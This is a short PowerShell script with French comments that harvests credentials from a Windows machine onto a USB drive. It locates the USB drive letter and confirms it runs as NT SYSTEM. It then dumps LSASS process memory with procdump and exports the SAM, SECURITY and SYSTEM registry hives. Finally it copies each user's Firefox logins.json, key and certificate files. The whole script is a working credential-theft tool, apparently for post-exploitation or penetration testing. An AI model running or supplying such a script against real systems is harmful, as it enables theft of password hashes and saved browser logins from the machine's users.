# Récupération de la lettre de la clé
$letter =  gwmi win32_diskdrive | ?{$_.interfacetype -eq "USB"} | %{gwmi -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID=`"$($_.DeviceID.replace('\','\\'))`"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"} |  %{gwmi -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass = Win32_LogicalDiskToPartition"} | %{$_.deviceid}
#$t = $letter+"\"
cd $letter
# On s'assure qu'on soit bien en NT SYSTEM
whoami.exe
$hostn = HOSTNAME.EXE

# On créé un fichier de vidage du LSA
tasklist.exe /fi "imagename eq lsass.exe" /fo LIST > GetSID.txt
$temp = Get-Content .\GetSID.txt | where { $_ -like "*PID*" }
$test = $temp -replace '\D+(\d+)','$1' 
rm .\GetSID.txt

.\procdump.exe -accepteula -ma $test $letter\$hostn\Data-System\lsass.dmp
# On dump les clés de registres de la base SAM
#reg save HKLM\SAM $letter\$hostn\Data-System\SAM.hiv
#reg save HKLM\SECURITY $letter\$hostn\Data-System\SECURITY.hiv
#reg save HKLM\SYSTEM $letter\$hostn\Data-System\SYSTEM.hiv

reg export HKLM\SAM $letter\$hostn\Data-System\SAM.hiv
reg export HKLM\SECURITY $letter\$hostn\Data-System\SECURITY.hiv
reg export HKLM\SYSTEM $letter\$hostn\Data-System\SYSTEM.hiv

# On dump les databases de mots de passe Chrome et Firefox
cd C:\
$Users = Get-ChildItem -Path "C:\Users"
cd $Users
foreach ($User in $Users)
{
    cd C:\Users\$User\AppData\Local
    mkdir $letter\$hostn\Data-Admin\$User

    # Dump Mozilla
    $mozillas = Get-ChildItem -Path "C:\Users\$User\AppData\Roaming\Mozilla\Firefox\Profiles"
    cd $mozillas
    foreach ($mozilla in $mozillas)
    {
        cp C:\Users\$User\AppData\Roaming\Mozilla\Firefox\Profiles\$mozilla\logins.json $letter\$hostn\Data-Admin\$User
        cp C:\Users\$User\AppData\Roaming\Mozilla\Firefox\Profiles\$mozilla\key* $letter\$hostn\Data-Admin\$User
        cp C:\Users\$User\AppData\Roaming\Mozilla\Firefox\Profiles\$mozilla\cert* $letter\$hostn\Data-Admin\$User
    }
}
Write-Host "Fin !"